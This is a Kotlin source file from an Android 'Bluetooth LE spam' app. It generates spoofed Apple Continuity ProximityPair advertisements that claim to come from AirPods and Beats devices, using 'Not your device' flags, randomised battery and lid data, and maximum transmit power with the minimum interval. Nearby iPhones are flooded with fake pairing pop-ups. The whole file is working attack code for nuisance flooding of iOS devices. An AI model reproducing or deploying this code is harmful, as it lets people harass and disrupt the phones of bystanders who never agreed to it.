package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers.Companion.toHexString
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData
import kotlin.random.Random

class ContinuityNotYourDevicePopUpAdvertisementSetGenerator: IAdvertisementSetGenerator {

    private val _logTag = "ContinuityNotYourDevicePopUpAdvertisementSetGenerator"
    private val _manufacturerId = 76 // 0x004c == 76 = Apple

    val deviceData = mapOf(
        "0E20" to "AirPods Pro",
        "0A20" to "AirPods Max",
        "0220" to "AirPods",
        "0F20" to "AirPods 2nd Gen",
        "1320" to "AirPods 3rd Gen",
        "1420" to "AirPods Pro 2nd Gen",
        "1020" to "Beats Flex",
        "0620" to "Beats Solo 3",
        "0320" to "Powerbeats 3",
        "0B20" to "Powerbeats Pro",
        "0C20" to "Beats Solo Pro",
        "1120" to "Beats Studio Buds",
        "0520" to "Beats X",
        "0920" to "Beats Studio 3",
        "1720" to "Beats Studio Pro",
        "1220" to "Beats Fit Pro",
        "1620" to "Beats Studio Buds+",
    )

    val colors_white = mapOf(
        "00" to "White"
    )

    val colors_airpods_max = mapOf(
        "00" to "White",
        "02" to "Red",
        "03" to "Blue",
        "0F" to "Black",
        "11" to "Light Green",
    )

    val colors_beats_flex = mapOf(
        "00" to "White",
        "01" to "Black",
    )

    val colors_beats_solo_3 = mapOf(
        "00" to "White",
        "01" to "Black",
        "06" to "Gray",
        "07" to "Gold/White",
        "08" to "Rose Gold",
        "09" to "Black",
        "0E" to "Violet/White",
        "0F" to "Bright Red",
        "12" to "Dark Red",
        "13" to "Swamp Green",
        "14" to "Dark Gray",
        "15" to "Dark Blue",
        "1D" to "Rose Gold 2",
        "20" to "Blue/Green",
        "21" to "Purple/Orange",
        "22" to "Deep Blue/ Light blue",
        "23" to "Magenta/Light Fuchsia",
        "25" to "Black/Red",
        "2A" to "Gray / Disney LTD",
        "2E" to "Pinkish white",
        "3D" to "Red/Blue",
        "3E" to "Yellow/Blue",
        "3F" to "White/Red",
        "40" to "Purple/White",
        "5B" to "Gold",
        "5C" to "Silver",
    )

    val colors_powerbeats_3 = mapOf(
        "00" to "White",
        "01" to "Black",
        "0B" to "Gray/Blue",
        "0C" to "Gray/Red",
        "0D" to "Gray/Green",
        "12" to "Red",
        "13" to "Swamp Green",
        "14" to "Gray",
        "15" to "Deep Blue",
        "17" to "Dark with Gold Logo",
    )

    val colors_powerbeats_pro = mapOf(
        "00" to "White",
        "02" to "Yellowish Green",
        "03" to "Blue",
        "04" to "Black",
        "05" to "Pink",
        "06" to "Red",
        "0B" to "Gray ?",
        "0D" to "Sky Blue",
    )

    val colors_beats_solo_pro = mapOf(
        "00" to "White",
        "01" to "Black",
    )

    val colors_beats_studio_buds = mapOf(
        "00" to "White",
        "01" to "Black",
        "02" to "Red",
        "03" to "Blue",
        "04" to "Pink",
        "06" to "Silver",
    )

    val colors_beats_x = mapOf(
        "00" to "White",
        "01" to "Black",
        "02" to "Blue",
        "05" to "Gray",
        "1D" to "Pink",
        "25" to "Dark/Red",

    )

    val colors_beats_studio_3 = mapOf(
        "00" to "White",
        "01" to "Black",
        "02" to "Red",
        "03" to "Blue",
        "18" to "Shadow Gray",
        "19" to "Desert Sand",
        "25" to "Black / Red",
        "26" to "Midnight Black",
        "27" to "Desert Sand 2",
        "28" to "Gray",
        "29" to "Clear blue/ gold",
        "42" to "Green Forest camo",
        "43" to "White Camo",
    )

    val colors_beats_studio_pro = mapOf(
        "00" to "White",
        "01" to "Black",
    )

    val colors_beats_fit_pro = mapOf(
        "00" to "White",
        "01" to "Black",
        "02" to "Pink",
        "03" to "Grey/White",
        "04" to "Full Pink",
        "05" to "Neon Green",
        "06" to "Night Blue",
        "07" to "Light Pink",
        "08" to "Brown",
        "09" to "Dark Brown",

    )

    val colors_beats_studio_buds_ = mapOf(
        "00" to "Black",
        "01" to "White",
        "02" to "Transparent",
        "03" to "Silver",
        "04" to "Pink",
    )

    val deviceColorsMap = mapOf(
        "0E20" to colors_white,
        "0A20" to colors_airpods_max,
        "0220" to colors_white,
        "0F20" to colors_white,
        "1320" to colors_white,
        "1420" to colors_white,
        "1020" to colors_beats_flex,
        "0620" to colors_beats_solo_3,
        "0320" to colors_powerbeats_3,
        "0B20" to colors_powerbeats_pro,
        "0C20" to colors_beats_solo_pro,
        "1120" to colors_beats_studio_buds,
        "0520" to colors_beats_x,
        "0920" to colors_beats_studio_3,
        "1720" to colors_beats_studio_pro,
        "1220" to colors_beats_fit_pro,
        "1620" to colors_beats_studio_buds_,
    )

    private fun getColorMap(deviceIdentifier: String):Map<String,String>{
        deviceColorsMap.forEach{
            if(it.key == deviceIdentifier){
                return it.value
            }
        }

        return mapOf()
    }

    companion object {
        fun getRandomBudsBatteryLevel():String{
            val level = ((0..9).random() shl 4) + (0..9).random()
            return StringHelpers.intToHexString(level)
        }

        fun getRandomChargingCaseBatteryLevel():String{
            var level = ((Random.nextInt(8) % 8) shl 4) + (Random.nextInt(10) % 10)
            return StringHelpers.intToHexString(level)
        }

        fun getRandomLidOpenCounter():String{
            var counter =  Random.nextInt(256)
            return StringHelpers.intToHexString(counter)
        }

        fun prepareAdvertisementSet(advertisementSet: AdvertisementSet):AdvertisementSet{

            if(advertisementSet.advertiseData.manufacturerData.size > 0){
                var payload = advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData

                // randomize random data

                /*
                var payload =
                            0 continuityType +
                            1 payloadSize +
                            2 prefix.key +
                            3 - 4 deviceData.key +
                            5 status +
                            6 getRandomBudsBatteryLevel() +
                            7 getRandomChargingCaseBatteryLevel() +
                            8 getRandomLidOpenCounter() +
                            9 color.key +
                            10 "00"*/

                //payload += Random.nextBytes(16).toHexString()

                payload[6] = StringHelpers.decodeHex(getRandomBudsBatteryLevel())[0]
                payload[7] = StringHelpers.decodeHex(getRandomChargingCaseBatteryLevel())[0]
                payload[8] = StringHelpers.decodeHex(getRandomLidOpenCounter())[0]

                for (i in 11..26) {
                    payload[i] = Random.nextBytes(1)[0]
                }

            }

            return advertisementSet
        }
    }

    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: deviceData

        data.forEach{deviceData ->
            val colorMap = getColorMap(deviceData.key)
            val prefix = "01" // => NOT YOUR DEVICE

                colorMap.forEach{ color ->

                    var advertisementSet = AdvertisementSet()
                    advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS

                    advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_NOT_YOUR_DEVICE

                    advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE

                    // Advertise Settings
                    advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
                    advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
                    advertisementSet.advertiseSettings.connectable = false
                    advertisementSet.advertiseSettings.timeout = 0

                    // Advertising Parameters
                    advertisementSet.advertisingSetParameters.legacyMode = true
                    advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
                    advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
                    // Phy is only used in non Legacy Mode
                    advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_CODED
                    advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_CODED
                    advertisementSet.advertisingSetParameters.scanable = true
                    advertisementSet.advertisingSetParameters.connectable = false

                    // AdvertiseData
                    advertisementSet.advertiseData.includeDeviceName = false

                    val manufacturerSpecificData = ManufacturerSpecificData()
                    manufacturerSpecificData.manufacturerId = _manufacturerId

                    var continuityType = "07" // 0x07 = ProximityPair
                    var payloadSize = "19" // 0x19 => 25
                    val status = "55"

                    var payload =
                        continuityType +
                        payloadSize +
                        prefix +
                        deviceData.key +
                        status +
                        getRandomBudsBatteryLevel() +
                        getRandomChargingCaseBatteryLevel() +
                        getRandomLidOpenCounter() +
                        color.key +
                        "00"
                    
                    // ADD 16 Random Bytes
                    payload += Random.nextBytes(16).toHexString()

                    // Airpods Example
                    //071907022075aa3001000045121212000000000000000000000000

                    //Log.d(_logTag, "Payload: " + payload)
                    manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(payload)

                    advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
                    advertisementSet.advertiseData.includeTxPower = false

                    // Scan Response
                    //advertisementSet.scanResponse.includeTxPower = false

                    // General Data
                    advertisementSet.title = "Not your " + deviceData.value + " " + color.value

                    // Callbacks
                    advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
                    advertisementSet.advertisingCallback = GenericAdvertisingCallback()

                    advertisementSets.add(advertisementSet)

                }
        }

        return advertisementSets.toList()
    }

}